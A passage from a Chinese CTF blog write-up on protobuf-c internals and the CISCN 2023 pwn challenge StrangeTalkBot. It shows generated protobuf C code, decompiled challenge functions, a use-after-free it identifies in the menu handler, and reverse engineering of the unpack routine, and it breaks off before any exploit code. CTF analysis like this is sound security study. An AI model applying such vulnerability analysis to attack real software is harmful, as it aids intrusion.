class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Generated by the protocol buffer compiler.  DO NOT EDIT! */</span></span><br><span class="line"><span class="comment">/* Generated from: test.proto */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Do not generate deprecated warnings for self */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PROTOBUF_C__NO_DEPRECATED</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTOBUF_C__NO_DEPRECATED</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;test.pb-c.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span>   <span class="title">test__init</span></span></span><br><span class="line"><span class="function">                     <span class="params">(Test         *message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> Test init_value = TEST__INIT;</span><br><span class="line">  *message = init_value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__get_packed_size</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test *message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;test__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_get_packed_size ((<span class="keyword">const</span> ProtobufCMessage*)(message));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__pack</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">uint8_t</span>       *out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;test__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_pack ((<span class="keyword">const</span> ProtobufCMessage*)message, out);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__pack_to_buffer</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      ProtobufCBuffer *buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;test__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_pack_to_buffer ((<span class="keyword">const</span> ProtobufCMessage*)message, buffer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Test *</span></span><br><span class="line"><span class="function">       <span class="title">test__unpack</span></span></span><br><span class="line"><span class="function">                     <span class="params">(ProtobufCAllocator  *allocator,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">size_t</span>               len,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">const</span> <span class="keyword">uint8_t</span>       *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (Test *)</span><br><span class="line">     protobuf_c_message_unpack (&amp;test__descriptor,</span><br><span class="line">                                allocator, len, data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span>   <span class="title">test__free_unpacked</span></span></span><br><span class="line"><span class="function">                     <span class="params">(Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      ProtobufCAllocator *allocator)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!message)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;test__descriptor);</span><br><span class="line">  protobuf_c_message_free_unpacked ((ProtobufCMessage*)message, allocator);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> ProtobufCFieldDescriptor test__field_descriptors[<span class="number">4</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;aaa&quot;</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_INT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Test, aaa),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;bbb&quot;</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_UINT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Test, bbb),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;ccc&quot;</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_SINT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Test, ccc),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;ddd&quot;</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_BYTES,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Test, ddd),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> test__field_indices_by_name[] = &#123;</span><br><span class="line">  <span class="number">0</span>,   <span class="comment">/* field[0] = aaa */</span></span><br><span class="line">  <span class="number">1</span>,   <span class="comment">/* field[1] = bbb */</span></span><br><span class="line">  <span class="number">2</span>,   <span class="comment">/* field[2] = ccc */</span></span><br><span class="line">  <span class="number">3</span>,   <span class="comment">/* field[3] = ddd */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> ProtobufCIntRange test__number_ranges[<span class="number">1</span> + <span class="number">1</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123; <span class="number">1</span>, <span class="number">0</span> &#125;,</span><br><span class="line">  &#123; <span class="number">0</span>, <span class="number">4</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> ProtobufCMessageDescriptor test__descriptor =</span><br><span class="line">&#123;</span><br><span class="line">  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,</span><br><span class="line">  <span class="string">&quot;test&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Test&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Test&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="keyword">sizeof</span>(Test),</span><br><span class="line">  <span class="number">4</span>,</span><br><span class="line">  test__field_descriptors,</span><br><span class="line">  test__field_indices_by_name,</span><br><span class="line">  <span class="number">1</span>,  test__number_ranges,</span><br><span class="line">  (ProtobufCMessageInit) test__init,</span><br><span class="line">  <span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved[123] */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个文件就是<code>test.pb-c.c</code>文件，内部对<code>test__field_descriptors</code>数组进行了复制，这里使用的结构体为<code>ProtobufCFieldDescriptor</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span> &#123;</span></span><br><span class="line"><span class="comment">/** Name of the field as given in the .proto file. */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>*name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Tag value of the field as given in the .proto file. */</span></span><br><span class="line"><span class="keyword">uint32_t</span>id;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span></span><br><span class="line">ProtobufCLabellabel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The type of the field. */</span></span><br><span class="line">ProtobufCTypetype;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span></span><br><span class="line"><span class="comment"> * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span></span><br><span class="line"><span class="comment"> * for repeated members or the case enum for oneofs).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span>quantifier_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes into the message&#x27;s C structure for the member</span></span><br><span class="line"><span class="comment"> * itself.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span>offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A type-specific descriptor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span></span><br><span class="line"><span class="comment"> * corresponding `ProtobufCEnumDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span></span><br><span class="line"><span class="comment"> * the corresponding `ProtobufCMessageDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Otherwise this field is NULL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">void</span>*descriptor; <span class="comment">/* for MESSAGE and ENUM types */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** The default value for this field, if defined. May be NULL. */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">void</span>*default_value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A flag word. Zero or more of the bits defined in the</span></span><br><span class="line"><span class="comment"> * `ProtobufCFieldFlag` enum may be set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">uint32_t</span>flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="keyword">unsigned</span>reserved_flags;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="keyword">void</span>*reserved2;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="keyword">void</span>*reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而这个结构体中的type就是数据的类型，需要注意的是，我们在<code>proto</code>文件中，分别定义了<code>int64</code>和<code>sint64</code>虽然结构体中都被翻译成了<code>int64_t</code>类型，但是可以在<code>test.pb-c.c</code>文件中看到，他们在上述结构体中的type值是不一样的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">PROTOBUF_C_TYPE_INT32,      <span class="comment">/**&lt; int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SINT32,     <span class="comment">/**&lt; signed int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SFIXED32,   <span class="comment">/**&lt; signed int32 (4 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_INT64,      <span class="comment">/**&lt; int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SINT64,     <span class="comment">/**&lt; signed int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SFIXED64,   <span class="comment">/**&lt; signed int64 (8 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_UINT32,     <span class="comment">/**&lt; unsigned int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_FIXED32,    <span class="comment">/**&lt; unsigned int32 (4 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_UINT64,     <span class="comment">/**&lt; unsigned int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_FIXED64,    <span class="comment">/**&lt; unsigned int64 (8 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_FLOAT,      <span class="comment">/**&lt; float */</span></span><br><span class="line">PROTOBUF_C_TYPE_DOUBLE,     <span class="comment">/**&lt; double */</span></span><br><span class="line">PROTOBUF_C_TYPE_BOOL,       <span class="comment">/**&lt; boolean */</span></span><br><span class="line">PROTOBUF_C_TYPE_ENUM,       <span class="comment">/**&lt; enumerated type */</span></span><br><span class="line">PROTOBUF_C_TYPE_STRING,     <span class="comment">/**&lt; UTF-8 or ASCII string */</span></span><br><span class="line">PROTOBUF_C_TYPE_BYTES,      <span class="comment">/**&lt; arbitrary byte sequence */</span></span><br><span class="line">PROTOBUF_C_TYPE_MESSAGE,    <span class="comment">/**&lt; nested message */</span></span><br><span class="line">&#125; ProtobufCType;</span><br></pre></td></tr></table></figure><p>而这里type值的定义是这样的，知道这个很重要，在后续的做题环节中需要。</p><p>然而，这种题目一般来说都是用户态的题目，而面对用户态题目我们写的脚本更多的是使用<code>python</code>去写，这里同样可以使用<code>protoc</code>工具生成<code>python</code>文件可以引入的文件。命令为:<code>protoc --python_out=. ./test.proto</code></p><h2 id="StrangeTalkBot"><a href="#StrangeTalkBot" class="headerlink" title="StrangeTalkBot"></a>StrangeTalkBot</h2><p>这道题是ciscn2023的第二道pwn题。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> v3; <span class="comment">// rsi</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init_io();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;byte_A060, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can try to have friendly communication with me now: &quot;</span>);</span><br><span class="line">    v3 = read(<span class="number">0</span>, &amp;byte_A060, <span class="number">0x400</span>uLL);</span><br><span class="line">    v4 = (_QWORD *)sub_192D(<span class="number">0LL</span>, v3, &amp;byte_A060);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sub_155D(v4[<span class="number">3</span>], v4[<span class="number">4</span>], v4[<span class="number">5</span>], v4[<span class="number">6</span>], v4[<span class="number">7</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  errExit(<span class="number">0LL</span>, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，题目主干比较清晰。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">sub_155D</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 opt,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">unsigned</span> __int64 idx,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 chunk_size,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 content_size,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">const</span> <span class="keyword">void</span> *content)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  size = chunk_size;</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt;= <span class="number">0x21</span> )</span><br><span class="line">    errExit();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)content_size &gt;= <span class="number">0xF1</span> )</span><br><span class="line">    errExit();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)chunk_size &gt;= <span class="number">0xF1</span> )</span><br><span class="line">    errExit();</span><br><span class="line">  <span class="keyword">if</span> ( chunk_size &lt; content_size )</span><br><span class="line">    size = content_size;</span><br><span class="line">  <span class="keyword">if</span> ( opt == <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">delete</span>(idx);</span><br><span class="line">  <span class="keyword">if</span> ( opt &gt; <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">  <span class="keyword">if</span> ( opt == <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">char</span> *)show(idx);</span><br><span class="line">  <span class="keyword">if</span> ( opt == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">char</span> *)create(idx, size, content_size, content);</span><br><span class="line">  <span class="keyword">if</span> ( opt != <span class="number">2</span> )</span><br><span class="line">LABEL_19:</span><br><span class="line">    errExit();</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">char</span> *)edit(idx, content_size, content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在这个函数内部其实就是很经典的菜单类堆题，并且题目中的漏洞也很简单，就是一个很单纯的UAF。麻烦的是<code>sub_192D</code>函数内部的<code>sub_5090</code>有很长的代码。虽然我也不知道怎么猜的，但是他就是<code>protobuf</code>对应的<code>unpack</code>函数。</p><h3 id="理解题目中的protobuf"><a href="#理解题目中的protobuf" class="headerlink" title="理解题目中的protobuf"></a>理解题目中的protobuf</h3><p>需要理解的话，首先就是需要确定题目中各个函数的含义以及部分可能需要知道的结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_192D</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_5090(&amp;unk_9C80, a1, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个函数内部只是调用了另外一个函数，并且返回出另外函数的返回值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">sub_5090</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">const</span> ProtobufCMessageDescriptor *desc,</span></span></span><br><span class="line"><span class="params"><span class="function">        ProtobufCAllocator *a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">unsigned</span> __int64 count,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">unsigned</span> __int8 *content)</span></span></span><br></pre></td></tr></table></figure><p>然而这个函数的返回值是一个指针(参数的类型都是已经经过了我的修改了)。其实通过对比可以发现结构很类似上述中的<code>unpack</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Test *<span class="title">test__unpack</span><span class="params">(ProtobufCAllocator  *allocator, <span class="keyword">size_t</span> len, <span class="keyword">const</span> <span class="keyword">uint8_t</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (Test *) protobuf_c_message_unpack (&amp;test__descriptor, allocator, len, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，可以通过搜索其内部的字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">actionid_str = desc-&gt;fields_sorted_by_name;</span><br><span class="line">canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="keyword">if</span> ( desc-&gt;magic != <span class="number">0x28AAEEF9</span> )</span><br><span class="line">  __assert_fail(</span><br><span class="line">  <span class="string">&quot;(desc)-&gt;magic == BINARYBF_C__MESSAGE_DESCRIPTOR_MAGIC&quot;</span>,</span><br><span class="line">  <span class="string">&quot;BINARYBF-c/BINARYBF-c.c&quot;</span>,</span><br><span class="line">  <span class="number">0xBF2</span>u,</span><br><span class="line">  <span class="string">&quot;BINARYBF_c_message_unpack&quot;</span>);</span><br></pre></td></tr></table></figure><p>比如函数开头的assert即可搜索到其源码位置。所以这个1200多行的函数其实就是<code>protobuf_c_message_unpack</code>函数。</p><p>那么就可以通过这个函数所使用的参数，直接在ida中添加结构体进行进一步分析。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> ProtobufCMessageDescriptor struc ; (<span class="keyword">sizeof</span>=<span class="number">0x78</span>, mappedto_19)</span><br><span class="line"><span class="number">00000000</span> magic dd ?</span><br><span class="line"><span class="number">00000004</span> name dq ?</span><br><span class="line"><span class="number">0000000</span>C short_name dq ?</span><br><span class="line"><span class="number">00000014</span> c_name dq ?</span><br><span class="line"><span class="number">0000001</span>C package_name dq ?</span><br><span class="line"><span class="number">00000024</span> sizeof_message dq ?</span><br><span class="line"><span class="number">0000002</span>C n_fields dd ?</span><br><span class="line"><span class="number">00000030</span> fields dq ?</span><br><span class="line"><span class="number">00000038</span> fields_sorted_by_name dq ?</span><br><span class="line"><span class="number">00000040</span> n_field_ranges dd ?</span><br><span class="line"><span class="number">00000044</span> field_ranges dq ?</span><br><span class="line"><span class="number">0000004</span>C message_init ProtobufCMessage ?</span><br><span class="line"><span class="number">00000060</span> reserved1 dq ?</span><br><span class="line"><span class="number">00000068</span> reserved2 dq ?</span><br><span class="line"><span class="number">00000070</span> reserved3 dq ?</span><br><span class="line"><span class="number">00000078</span> ProtobufCMessageDescriptor ends</span><br><span class="line"><span class="number">00000078</span></span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> ProtobufCMessage struc ; (<span class="keyword">sizeof</span>=<span class="number">0x14</span>, mappedto_21)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: ProtobufCMessageDescriptor/r</span><br><span class="line"><span class="number">00000000</span> descriptor dq ?</span><br><span class="line"><span class="number">00000008</span> n_unknown_fields dd ?</span><br><span class="line"><span class="number">0000000</span>C unknown_fields dq ?</span><br><span class="line"><span class="number">00000014</span> ProtobufCMessage ends</span><br><span class="line"><span class="number">00000014</span></span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> ProtobufCAllocator struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, 